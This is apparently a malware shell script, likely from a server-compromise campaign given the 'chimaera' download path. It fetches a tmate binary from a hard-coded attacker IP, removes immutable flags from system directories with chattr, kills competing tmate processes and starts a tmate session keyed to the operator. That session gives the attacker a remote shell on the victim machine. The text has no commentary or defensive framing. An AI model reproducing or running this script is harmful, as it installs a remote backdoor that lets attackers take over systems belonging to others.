
# wget -q http://45.9.148.35/chimaera/sh/setup_tmate.sh -O /tmp/.tm

mkdir -p /var/tmp/ 2>/dev/null
chattr -ia / /var/ /var/tmp/ 2>/dev/null
pkill tmate 2>/dev/null
if [ ! -f "/tmp/tmate" ]; then wget http://45.9.148.35/chimaera/bin/x86_64/tmate -O /tmp/tmate; fi
if [ ! -f "/tmp/tmate" ]; then curl http://45.9.148.35/chimaera/bin/x86_64/tmate -o /tmp/tmate; fi

chmod +x /tmp/tmate
URLTOKEN=$(curl -s 147.75.47.199 || wget -q -O - 147.75.47.199 | sed 's/./x/g')"O"$RANDOM
/tmp/tmate -F -k tmk-4ST6GRXU6GPUjlXHfSlNe0ZaT2 -n $URLTOKEN >> /tmp/.tmbd &

cat /tmp/.tmbd

exit

